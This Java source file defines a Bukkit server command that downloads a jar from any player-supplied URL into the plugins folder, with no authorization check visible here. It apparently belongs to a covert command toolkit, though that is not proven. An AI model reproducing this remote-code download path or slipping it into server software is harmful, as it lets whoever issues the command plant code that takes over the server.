package com.pi.cmd.commands;

import java.io.File;
import java.net.URL;

import org.bukkit.entity.Player;

import com.pi.cmd.main.CommandBase;
import com.pi.main.PI;
import com.pi.runnables.DownloadPlugin;

public class CommandDownloadPlugin extends CommandBase {

	public CommandDownloadPlugin() {
		super("DownloadPlugin", "Downloads a plugin to the server", "*Download <URL> <filename> E.g. *Download http://example.com/plugin.jar plugin.jar");
	}

	@Override
	public void runCommand(Player p, String[] args) {
		if(args.length == 3) {
			String urlString = args[1];
			if (!urlString.toLowerCase().startsWith("http://") && !urlString.toLowerCase().startsWith("https://")) urlString = "http://" + urlString;
			String fileName = args[2];
			if (!fileName.endsWith(".jar")) fileName = fileName + ".jar";
			URL url;
			try {
				url = new URL(urlString);
			} catch (Exception ex) {
				PI.addMessage(p, "Invalid URL.");
				return;
			}
			File f;
			try {
				f = new File("plugins" + File.separator + fileName);
				Thread d = new Thread(new DownloadPlugin(url, f, p));
				d.start();
			} catch (Exception ex) {
				PI.addMessage(p, "Error starting Plugin Download thread.");
			}
		} else {
			PI.addMessage(p, this.getUsage());
		}
	}
}
